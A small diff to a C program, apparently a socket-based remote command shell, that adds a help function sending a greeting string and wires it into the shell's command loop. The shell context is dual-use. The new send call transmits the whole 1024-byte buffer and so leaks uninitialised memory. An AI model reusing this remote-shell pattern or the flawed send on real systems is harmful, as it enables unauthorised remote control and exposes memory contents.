@@ -133,6 +133,17 @@ void get_pwd(char* buffer, int bufferSize) {
     send(sock, buffer, strlen(buffer), 0);
 }
 
+void help(int sock) {
+    char buffer[1024];
+    strcpy(buffer, "holla ayudaaaaa");
+
+    ssize_t bytesSent = send(sock, buffer, sizeof(buffer), 0);
+    if (bytesSent == -1) {
+        perror("Error al enviar datos a través del socket");
+        // Puedes agregar lógica adicional en caso de error
+    }
+}
+
 void Shell() {
     char buffer[1024];
     char container[1024];
@@ -151,7 +162,8 @@ void Shell() {
             exit(0);
         }
         else if(strncmp("help", buffer, 5) == 0){
-            printf("caca");
+            //send(sock, buffer, sizeof(buffer), 0);
+            help(sock);
         }
         else if(strncmp("pwd", buffer, 3) == 0){
             char buffer[MAX_BUFFER_SIZE];
